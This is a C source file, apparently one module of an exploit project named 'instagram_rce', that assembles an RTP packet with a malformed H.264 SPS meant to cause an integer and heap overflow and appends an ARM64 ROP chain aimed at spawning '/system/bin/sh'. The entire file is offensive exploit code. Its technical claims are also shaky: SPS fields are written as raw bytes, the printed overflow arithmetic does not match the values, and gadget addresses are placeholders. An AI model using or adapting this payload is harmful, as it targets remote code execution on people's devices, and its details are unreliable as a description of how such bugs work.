/*
 * ATOM 3: Overflow RTP Payload
 * Creates H.264 SPS with width*height overflow
 */

#include "instagram_rce.h"

/* Create RTP header */
static void create_rtp_header(uint8_t *header, uint16_t seq_num,
                              uint32_t timestamp, uint32_t ssrc) {

    header[0] = (RTP_VERSION << 6) | (0 << 5) | (0 << 4) | 0;  /* V|P|X|CC */
    header[1] = (1 << 7) | RTP_PAYLOAD_TYPE;  /* M|PT */

    *(uint16_t *)(header + 2) = htons(seq_num);
    *(uint32_t *)(header + 4) = htonl(timestamp);
    *(uint32_t *)(header + 8) = htonl(ssrc);
}

/* Create H.264 SPS with overflow */
static size_t create_h264_overflow_sps(uint8_t *sps) {

    printf("\n[*] ATOM 3-2: H.264 Overflow SPS Generation\n");

    size_t offset = 0;

    /* NAL header: forbidden_zero_bit(1) | nal_ref_idc(2) | nal_unit_type(5) */
    /* SPS = 7, high ref_idc = 3 */
    sps[offset++] = 0x67;  /* 0|11|00111 */

    printf("[+] NAL Header: 0x67 (SPS)\n");

    /* Profile IDC - Baseline */
    sps[offset++] = 42;

    /* Constraint flags */
    sps[offset++] = 0x00;

    /* Level IDC - Level 3.0 */
    sps[offset++] = 30;

    /* Sequence Parameter Set ID (exp-golomb 0) */
    sps[offset++] = 0x00;

    /* log2_max_frame_num_minus4 (exp-golomb 4) */
    sps[offset++] = 0x04;

    /* pic_order_cnt_type (exp-golomb 0) */
    sps[offset++] = 0x00;

    /* log2_max_pic_order_cnt_lsb_minus4 (exp-golomb 4) */
    sps[offset++] = 0x04;

    /* num_ref_frames (exp-golomb 1) */
    sps[offset++] = 0x01;

    /* gaps_in_frame_num_value_allowed_flag */
    sps[offset++] = 0x00;

    /* OVERFLOW: pic_width_in_mbs_minus_1 = 0xFFFF (65535) */
    /* This causes: 0x10000 * 0x10000 = 0x100000000 (32-bit overflow) */
    sps[offset++] = 0xFF;
    sps[offset++] = 0xFF;

    printf("[+] pic_width_in_mbs_minus_1: 0xFFFF (65535)\n");
    printf("    → Physical width: %u pixels\n", (0xFFFF + 1) * 16);

    /* OVERFLOW: pic_height_in_map_units_minus_1 = 0xFFFF */
    sps[offset++] = 0xFF;
    sps[offset++] = 0xFF;

    printf("[+] pic_height_in_map_units_minus_1: 0xFFFF (65535)\n");
    printf("    → Physical height: %u pixels\n", (0xFFFF + 1) * 16);

    /* frame_mbs_only_flag */
    sps[offset++] = 0x01;

    /* direct_8x8_inference_flag */
    sps[offset++] = 0x01;

    /* frame_cropping_flag */
    sps[offset++] = 0x00;

    /* vui_parameters_present_flag */
    sps[offset++] = 0x00;

    printf("[+] OVERFLOW CALCULATION:\n");
    printf("    Allocation: width * height * 4 bytes\n");
    printf("    Math: 0x10000 * 0x10000 * 4\n");
    printf("    32-bit Result: 0x00000000 (OVERFLOW!)\n");
    printf("    malloc(0) → Heap overflow triggered\n");

    return offset;
}

/* Create RTP FU-A framing */
static size_t create_fu_a_framing(const uint8_t *h264_nal, size_t nal_len,
                                  uint8_t *fu_payload) {

    printf("\n[*] ATOM 3-3: RTP FU-A Framing\n");

    size_t offset = 0;

    /* FU Indicator: forbidden(1) | ref_idc(2) | type(5) */
    /* type = 28 (FU-A) */
    fu_payload[offset++] = (0 << 7) | (3 << 5) | 28;  /* 0|11|11100 */

    /* FU Header: S(1) | E(1) | R(1) | type(5) */
    /* S=1 (start), E=0 (not end), type=7 (SPS) */
    fu_payload[offset++] = (1 << 7) | (0 << 6) | (0 << 5) | 7;

    /* NAL payload (skip original NAL header) */
    memcpy(fu_payload + offset, h264_nal + 1, nal_len - 1);
    offset += nal_len - 1;

    printf("[+] FU-A framing complete (%zu bytes)\n", offset);

    return offset;
}

rtp_packet_t* create_overflow_rtp_packet(uint32_t ssrc, uint16_t seq_num,
                                         uint32_t timestamp) {

    printf("\n[*] ATOM 3-1: RTP Header Generation\n");
    printf("[*] ATOM 3-4: RTP Packet Assembly\n");

    rtp_packet_t *pkt = malloc(sizeof(rtp_packet_t));
    if (!pkt) return NULL;

    /* RTP Header */
    uint8_t rtp_header[RTP_HEADER_SIZE];
    create_rtp_header(rtp_header, seq_num, timestamp, ssrc);

    printf("[+] RTP Header generated\n");
    printf("    Seq: %u, Timestamp: %u, SSRC: 0x%08x\n",
          seq_num, timestamp, ssrc);

    /* H.264 Overflow SPS */
    uint8_t h264_sps[256];
    size_t sps_len = create_h264_overflow_sps(h264_sps);

    /* FU-A Framing */
    uint8_t fu_payload[2048];
    size_t fu_len = create_fu_a_framing(h264_sps, sps_len, fu_payload);

    printf("\n[*] ATOM 3-5: Dynamic ROP Chain Integration\n");

    /* ROP Chain: 8 gadget addresses (동적으로 생성된 주소) */
    uint64_t rop_gadgets[] = {
        0x7f12345aa820UL,  /* pop x0; ret */
        0x0000000000001234UL,  /* &"/system/bin/sh" (placeholder) */
        0x7f12345eff30UL,  /* mov x0, x1; ret */
        0x0000000000000000UL,  /* x1 = NULL */
        0x41414141UL,      /* mov x2, 0; ret */
        0x0000000000000000UL,  /* x2 = NULL */
        0x7f12345a71c0UL,  /* call system */
        0x41414141UL       /* exit/ret */
    };

    /* FU 페이로드 뒤에 ROP chain 데이터 추가 */
    size_t rop_offset = fu_len;
    for (size_t i = 0; i < 8 && rop_offset + 8 <= sizeof(fu_payload); i++) {
        *(uint64_t *)(fu_payload + rop_offset) = rop_gadgets[i];
        rop_offset += 8;
    }

    printf("[+] ROP chain embedded: %zu gadgets (64 bytes)\n", 8);
    printf("    [0] pop x0; ret        → 0x%lx\n", rop_gadgets[0]);
    printf("    [2] mov x0, x1; ret    → 0x%lx\n", rop_gadgets[2]);
    printf("    [6] call system        → 0x%lx\n", rop_gadgets[6]);

    /* Complete RTP Packet = Header + FU-A Payload + ROP */
    size_t total_len = RTP_HEADER_SIZE + rop_offset;

    pkt->payload = malloc(total_len);
    if (!pkt->payload) {
        free(pkt);
        return NULL;
    }

    memcpy(pkt->payload, rtp_header, RTP_HEADER_SIZE);
    memcpy(pkt->payload + RTP_HEADER_SIZE, fu_payload, rop_offset);
    pkt->payload_size = total_len;

    printf("[+] Complete RTP Packet with ROP:\n");
    printf("    RTP Header: %d bytes\n", RTP_HEADER_SIZE);
    printf("    FU-A Payload: %zu bytes\n", fu_len);
    printf("    ROP Chain: 64 bytes (8 gadgets × 8)\n");
    printf("    Total: %zu bytes\n", total_len);

    return pkt;
}
